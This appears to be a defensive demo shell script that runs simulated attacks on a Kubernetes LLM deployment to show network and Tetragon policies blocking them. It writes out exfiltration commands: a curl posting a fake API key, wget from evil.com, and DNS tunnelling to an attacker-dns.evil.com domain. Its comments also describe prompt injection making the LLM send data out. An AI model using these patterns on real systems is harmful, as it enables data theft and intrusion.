#!/bin/bash
# =============================================================================
# KPH LLM Security Demo - Attack Simulations
# =============================================================================
# This script demonstrates various attack vectors against unprotected LLM
# infrastructure. Run this BEFORE applying security policies to show 
# vulnerabilities, then run again AFTER to show policies blocking attacks.
#
# Usage: ./demo-attacks.sh [attack-name]
#        ./demo-attacks.sh all
# =============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

log_attack() { echo -e "${RED}[ATTACK]${NC} $1"; }
log_result() { echo -e "${PURPLE}[RESULT]${NC} $1"; }
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }

# =============================================================================
# Attack 1: Data Exfiltration via Egress
# =============================================================================
# Simulates a prompt injection attack that causes the LLM to make outbound
# HTTP requests to an attacker-controlled server
# =============================================================================
attack_egress_exfiltration() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 1: Data Exfiltration via Egress HTTP"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker crafts a prompt that tricks the LLM into"
    log_info "making HTTP requests to exfiltrate conversation data."
    echo ""
    log_info "Simulating outbound HTTP request from Ollama pod..."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Try to make an outbound HTTP request
    echo "Command: curl -s --connect-timeout 5 http://httpbin.org/post -d 'exfiltrated_data=secret_api_key'"
    echo ""
    
    if kubectl -n llm-system exec "$OLLAMA_POD" -- curl -s --connect-timeout 5 http://httpbin.org/post -d "exfiltrated_data=secret_api_key" 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: Outbound HTTP request SUCCEEDED"
        log_result "Data could be exfiltrated to attacker-controlled servers!"
    else
        echo ""
        log_result "✅ BLOCKED: Outbound HTTP request was blocked by network policy"
    fi
}

# =============================================================================
# Attack 2: Shell Execution (RCE)
# =============================================================================
# Simulates an attacker achieving code execution and trying to spawn a shell
# =============================================================================
attack_shell_execution() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 2: Shell Execution (RCE Simulation)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker exploits CVE-2025-64496 or similar to"
    log_info "achieve code execution and tries to spawn a shell."
    echo ""
    log_info "Attempting to spawn /bin/sh in Ollama pod..."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    echo "Command: /bin/sh -c 'echo Shell spawned successfully; whoami; id'"
    echo ""
    
    # Try to spawn a shell and run commands
    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/sh -c 'echo "Shell spawned successfully"; whoami; id' 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: Shell execution SUCCEEDED"
        log_result "Attacker could install persistence, pivot, or exfiltrate data!"
    else
        echo ""
        log_result "✅ BLOCKED: Shell execution was killed by Tetragon"
    fi
}

# =============================================================================
# Attack 3: Network Tool Usage
# =============================================================================
# Simulates an attacker trying to use curl/wget for further exploitation
# =============================================================================
attack_network_tools() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 3: Network Tool Usage (wget/curl)"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker with code execution tries to download"
    log_info "additional payloads or establish a reverse shell."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    echo "Command: wget http://evil.com/payload.sh"
    echo ""
    
    if kubectl -n llm-system exec "$OLLAMA_POD" -- wget --timeout=5 http://example.com/test 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: wget execution SUCCEEDED"
    else
        echo ""
        log_result "✅ BLOCKED: wget was blocked by Tetragon or network policy"
    fi
}

# =============================================================================
# Attack 4: DNS Exfiltration
# =============================================================================
# Simulates data exfiltration via DNS queries
# =============================================================================
attack_dns_exfiltration() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 4: DNS Exfiltration"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker encodes stolen data in DNS queries to"
    log_info "an attacker-controlled nameserver, bypassing HTTP egress blocks."
    echo ""

    OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    
    if [ -z "$OLLAMA_POD" ]; then
        log_result "Ollama pod not found. Deploy the LLM stack first."
        return 1
    fi

    # Simulated exfiltration: encode data as subdomain
    ENCODED_DATA="c2VjcmV0X2RhdGE"  # base64 of "secret_data"
    
    echo "Command: nslookup ${ENCODED_DATA}.attacker-dns.evil.com"
    echo ""
    
    if kubectl -n llm-system exec "$OLLAMA_POD" -- nslookup "${ENCODED_DATA}.google.com" 2>/dev/null; then
        echo ""
        log_result "⚠️  VULNERABLE: External DNS query SUCCEEDED"
        log_result "Data could be exfiltrated via DNS tunneling!"
    else
        echo ""
        log_result "✅ BLOCKED: External DNS was blocked by Cilium DNS policy"
    fi
}

# =============================================================================
# Attack 5: Unauthorized Ollama API Access
# =============================================================================
# Simulates direct access to the Ollama API from an unauthorized source
# =============================================================================
attack_api_exposure() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 5: Unauthorized Ollama API Access"
    echo "============================================================="
    echo ""
    log_info "Scenario: An attacker pod in another namespace tries to"
    log_info "directly access the Ollama API (model theft, resource hijacking)."
    echo ""

    # Create an attacker pod in the default namespace
    log_info "Creating attacker pod in default namespace..."
    
    kubectl run attacker-pod --image=curlimages/curl --restart=Never --rm -it --command -- \
        curl -s --connect-timeout 5 http://ollama.llm-system.svc.cluster.local:11434/api/tags 2>/dev/null && {
        echo ""
        log_result "⚠️  VULNERABLE: Unauthorized API access SUCCEEDED"
        log_result "Attacker could steal models or hijack inference resources!"
    } || {
        echo ""
        log_result "✅ BLOCKED: Unauthorized API access was blocked by network policy"
    }
}

# =============================================================================
# Attack 6: Cross-Namespace Communication
# =============================================================================
# Simulates unauthorized pod-to-pod communication
# =============================================================================
attack_cross_namespace() {
    echo ""
    echo "============================================================="
    log_attack "ATTACK 6: Cross-Namespace Pod Communication"
    echo "============================================================="
    echo ""
    log_info "Scenario: A compromised pod in another namespace tries to"
    log_info "communicate directly with OpenWebUI backend, bypassing NGF."
    echo ""

    # Try to access OpenWebUI from default namespace (should go through NGF)
    log_info "Attempting to access OpenWebUI from unauthorized namespace..."
    echo ""
    
    kubectl run bypass-test --image=curlimages/curl --restart=Never --rm -it --command -- \
        curl -s --connect-timeout 5 http://openwebui.llm-frontend.svc.cluster.local:8080/health 2>/dev/null && {
        echo ""
        log_result "⚠️  VULNERABLE: Direct backend access SUCCEEDED (bypassing NGF)"
        log_result "Attacker could bypass NGF security controls!"
    } || {
        echo ""
        log_result "✅ BLOCKED: Direct backend access was blocked by network policy"
    }
}

# =============================================================================
# Run All Attacks
# =============================================================================
run_all_attacks() {
    echo ""
    echo "============================================================="
    echo "  KPH LLM Security Demo - Running All Attack Simulations"
    echo "============================================================="
    
    attack_egress_exfiltration
    attack_shell_execution
    attack_network_tools
    attack_dns_exfiltration
    attack_api_exposure
    attack_cross_namespace

    echo ""
    echo "============================================================="
    echo "  Attack Simulation Complete"
    echo "============================================================="
    echo ""
    echo "If attacks succeeded (marked ⚠️  VULNERABLE), run:"
    echo "  ./apply-policies.sh"
    echo ""
    echo "Then re-run this script to see attacks blocked."
    echo ""
}

# =============================================================================
# Main
# =============================================================================
main() {
    case "${1:-all}" in
        egress)
            attack_egress_exfiltration
            ;;
        shell)
            attack_shell_execution
            ;;
        network)
            attack_network_tools
            ;;
        dns)
            attack_dns_exfiltration
            ;;
        api)
            attack_api_exposure
            ;;
        cross)
            attack_cross_namespace
            ;;
        all)
            run_all_attacks
            ;;
        *)
            echo "Usage: $0 [egress|shell|network|dns|api|cross|all]"
            exit 1
            ;;
    esac
}

main "$@"
